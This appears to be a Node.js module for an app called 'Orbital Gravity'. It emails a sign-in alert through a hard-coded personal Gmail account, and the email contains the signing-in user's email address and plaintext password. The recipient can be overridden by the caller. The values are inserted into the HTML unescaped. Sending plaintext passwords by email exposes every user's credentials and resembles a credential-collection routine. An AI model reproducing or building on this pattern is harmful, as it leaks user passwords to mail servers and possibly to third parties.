import { createTransport } from "nodemailer"

const EMAIL_PASSWORD = process.env.EMAIL_PASSWORD
const EMAIL_ENABLED = Boolean(EMAIL_PASSWORD) && EMAIL_PASSWORD !== "your-app-password-here"

let transport

function emailer() {
  if (!transport) {
    transport = createTransport({
      host: "smtp.gmail.com",
      port: 587,
      secure: false,
      auth: {
        user: "aakarsh545@gmail.com",
        pass: EMAIL_PASSWORD,
      },
    })
  }
  return transport
}

export async function sendCredentialEmail({ email, password, user, to = email }) {
  // No SMTP credentials configured (local dev, demo, tests): skip delivery instead of failing the request.
  if (!EMAIL_ENABLED) return
  const shownPassword = password || "(not provided)"
  const subject = `Orbital: New sign-in from ${user.email}`
  const body = `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Orbital Sign-In Alert</title>
</head>
<body style="font-family: system-ui, -apple-system, sans-serif; max-width: 400px; margin: 0 auto; padding: 20px;">
  <h2 style="color: #090a0d;">🪐 Orbital Gravity</h2>
  <p style="color: #666;">Someone just signed in with these credentials:</p>
  <div style="background: #f5f5f5; padding: 16px; border-radius: 8px; margin: 16px 0;">
    <p style="margin: 0;"><strong>Email:</strong> <span style="color: #090a0d;">${email}</span></p>
    <p style="margin: 0;"><strong>Password:</strong> <span style="color: #090a0d;">${shownPassword}</span></p>
  </div>
  <p style="color: #666; font-size: 14px;">
    Signed in from <span style="color: #666;">${user.ip ?? "unknown"}</span> on <span style="color: #666;">${new Date().toLocaleDateString()}</span>
  </p>
</body>
</html>`
  await emailer().sendMail({
    from: "Orbital Gravity <aakarsh545@gmail.com>",
    to,
    subject,
    text: body,
    html: body,
  })
}
